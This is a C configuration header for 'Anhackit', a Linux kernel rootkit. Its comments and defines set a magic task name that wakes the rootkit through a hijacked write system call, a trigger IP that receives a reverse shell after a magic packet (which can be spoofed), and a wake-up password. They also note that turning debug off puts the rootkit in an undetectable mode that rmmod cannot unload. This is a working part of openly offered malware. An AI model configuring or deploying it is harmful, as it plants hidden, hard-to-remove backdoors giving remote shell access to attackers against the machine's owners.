/*
    Anhackit config file - Developed by Anhackin
*/

/*
    Set DEBUG to 1 if you want debug log (run dmesg to see the kernel logs)

    NB: If DEBUG is set to 0 the rootkit goes into undetectable mode
        and it is therefore impossible to unload it with rmmod !!!
*/
#define DEBUG 1

/*
    The name of the task making the hijacked write system call

    NB: Remember that the rootkit doesn't awake if the task name do not match
*/
static char magic_task[] = "helloworld";

/*
    The ip that will send the magic packet

    NB: Also work with a spoofed ip address but remember
        that the reverse shell is always send to this ip.
        In other words you only can send the magic packet
        from another terminal but the spoofed ip address
        will receive the reverse shell.
*/
static char magic_ip[] = "127.0.0.1";

/*
    Password required to awake the rootkit

    NB: In local mode you write the password in a file with the magic task
        In remote mode you send the password in the magic packet payload
*/
static char magic_password[] = "anhackin";
